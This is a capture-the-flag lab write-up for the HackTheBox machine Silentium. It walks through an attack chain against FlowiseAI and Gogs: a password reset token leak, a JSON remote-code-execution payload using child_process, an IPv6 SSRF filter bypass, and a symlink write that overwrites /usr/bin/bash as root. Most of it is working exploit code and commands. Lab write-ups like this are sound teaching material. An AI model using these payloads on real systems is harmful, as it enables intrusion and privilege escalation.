# Silentium — HackTheBox Lab Writeup

## Overview

**Target:** silentium.htb  
**Attack Chain:** Flowise RCE → SSH as ben → Gogs SSRF + symlink write → bash replacement → root

---

## Phase 1: Reconnaissance

### 1.1 — Vhost Discovery

```bash
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" \
  -w /path/to/subdomains.txt -x http://localhost:8443
```

Discovered vhosts:
- `staging.silentium.htb` — FlowiseAI instance (port 3000, proxied)
- `staging-v2-code.dev.silentium.htb` — Gogs git service (port 3001, proxied)

### 1.2 — Service Identification

- **FlowiseAI v3.0.5** on `staging.silentium.htb`
- **Gogs** (self-hosted Git) on `staging-v2-code.dev.silentium.htb`, running as `root` (`RUN_USER = root`)
- Both services run inside Docker containers on the host

---

## Phase 2: Initial Foothold — FlowiseAI RCE

### 2.1 — CVE-2025-58434: Password Reset Token Leak

FlowiseAI exposes temporary password reset tokens through an unauthenticated endpoint.

```bash
# Trigger password reset for the default admin
curl -x http://localhost:8443 \
  -X POST http://staging.silentium.htb/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@silentium.htb"}'

# Retrieve the temp token (leaked via API)
curl -x http://localhost:8443 \
  http://staging.silentium.htb/api/v1/verify-temp-token/<token>
```

Use the token to reset the admin password → obtain a valid API key.

**API Key obtained:** `hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc`

### 2.2 — CVE-2025-59528: CustomMCP Node RCE

The CustomMCP node's `mcpServerConfig` field is evaluated via JavaScript's `Function()` constructor, allowing arbitrary code execution.

The payload uses `process.mainModule.require("child_process")` to run system commands, then exfiltrates output by base64-encoding it and storing it in the Flowise variables API.

```bash
# RCE payload structure (simplified):
curl -x http://localhost:8443 \
  -X POST "http://staging.silentium.htb/api/v1/node-custom-function" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d @flowise_payload.json

# Retrieve output
curl -x http://localhost:8443 \
  http://staging.silentium.htb/api/v1/variables \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" | jq
```

**flowise_payload.json:**
```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){var cp=process.mainModule.require('child_process');var http=process.mainModule.require('http');var out=cp.execSync('COMMAND').toString();var data=JSON.stringify({name:'output',value:Buffer.from(out).toString('base64'),type:'static'});var options={hostname:'127.0.0.1',port:3000,path:'/api/v1/variables',method:'POST',headers:{'Content-Type':'application/json','Content-Length':data.length,'Authorization':'Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc'}};var req=http.request(options);req.write(data);req.end();cp.execSync('sleep 1');return 1;})()})"
  }
}
```

Replace `COMMAND` with any shell command. Output is base64-encoded in the Flowise variables store.

### 2.3 — Credential Discovery

Using RCE to enumerate the Docker container's environment:

```
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_PASSWORD=F1l3_d0ck3r
```

The SMTP password `r04D!!_R4ge` is reused as the SSH password for user `ben` on the host.

---

## Phase 3: User Flag

```bash
ssh ben@silentium.htb
# Password: r04D!!_R4ge

cat ~/user.txt
# 
```

---

## Phase 4: Privilege Escalation — Gogs Exploitation Chain

### 4.1 — Create Gogs Account

Gogs has open registration with a captcha. Register via the web UI:

- URL: `http://staging-v2-code.dev.silentium.htb/user/sign_up`
- Credentials: `hacker` / `Hacker123!` / `hacker@test.com`
- Solve the captcha manually in a browser

Then create an API access token via **Settings → Applications**.

### 4.2 — Prepare Symlink Repository

On your attack machine, create a git repo containing a symlink to `/usr/bin/bash`:

```bash
# Create working repo with symlink
mkdir /tmp/local_repo2 && cd /tmp/local_repo2
git init
echo "test" > README.md
ln -s /usr/bin/bash bash_link
git add -A && git commit -m "repo with symlink"

# Create bare repo for HTTP serving
git clone --bare /tmp/local_repo2 /tmp/serve_repo2
cd /tmp/serve_repo2 && git update-server-info

# Serve via HTTP on port 8888
cd /tmp && python3 -m http.server 8888
```

### 4.3 — SSH Reverse Tunnel

Forward local port 8888 to the target host so Gogs can reach our git server. Must bind both IPv4 and IPv6 because Gogs resolves `[::]` to IPv6:

```bash
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -N \
  -R 127.0.0.1:8888:127.0.0.1:8888 \
  -R [::1]:8888:127.0.0.1:8888 \
  ben@silentium.htb
# Password: r04D!!_R4ge
```

### 4.4 — SSRF Bypass: Migrate Repository into Gogs

Gogs blocks migration from private/loopback IPs. The IPv6 unspecified address `[::]` bypasses this check because Go's `net.IP.IsPrivate()` and `net.IP.IsLoopback()` return false for `::` — only `net.IP.IsUnspecified()` catches it, and Gogs doesn't call that function.

```bash
curl -x http://localhost:8443 \
  -X POST "http://staging-v2-code.dev.silentium.htb/api/v1/repos/migrate" \
  -H "Authorization: token <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "http://[::]:8888/serve_repo2",
    "uid": <YOUR_UID>,
    "repo_name": "symlink-repo"
  }'
```

This clones our repo (including the `bash_link` symlink) into Gogs.

### 4.5 — CVE-2025-8110: Write Through Symlink via API

Gogs' web editor blocks editing symlinks, but the **PutContents API** (`PUT /api/v1/repos/:owner/:repo/contents/:filepath`) follows symlinks and writes to the target file. Since Gogs runs as root, this writes to `/usr/bin/bash`:

```bash
# Base64-encode the malicious bash replacement
CONTENT=$(echo -n '#!/bin/dash
cp /root/root.txt /tmp/flag.txt 2>/dev/null
chmod 777 /tmp/flag.txt 2>/dev/null
exec /usr/bin/dash "$@"' | base64)

curl -x http://localhost:8443 \
  -X PUT "http://staging-v2-code.dev.silentium.htb/api/v1/repos/hacker/symlink-repo/contents/bash_link" \
  -H "Authorization: token <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d "{
    \"message\": \"update\",
    \"content\": \"$CONTENT\"
  }"
```

This overwrites `/usr/bin/bash` with our script. Now any invocation of `/usr/bin/bash` as root will copy the root flag.

### 4.6 — Trigger Root Execution

Trigger a Gogs operation that invokes bash as root. The web editor commit runs git hooks under the Gogs service user (root):

1. Navigate to any file in any Gogs repo via the web UI
2. Click **Edit** → make a trivial change → click **Commit Changes**
3. The commit triggers git hooks → `/usr/bin/bash` runs as root → flag is copied

### 4.7 — Read Root Flag

```bash
ssh ben@silentium.htb
# Note: SSH now uses our modified bash, which copies the flag then falls through to dash
cat /tmp/flag.txt
# 
```

---

## CVE Summary

| CVE | Product | Impact |
|-----|---------|--------|
| CVE-2025-58434 | FlowiseAI v3.0.5 | Password reset token leak → account takeover |
| CVE-2025-59528 | FlowiseAI v3.0.5 | CustomMCP node RCE via Function() constructor |
| CVE-2025-8110 | Gogs | PutContents API writes through symlinks (bypasses web editor check) |
| *(no CVE)* | Gogs | SSRF filter bypass via IPv6 unspecified address `[::]` |

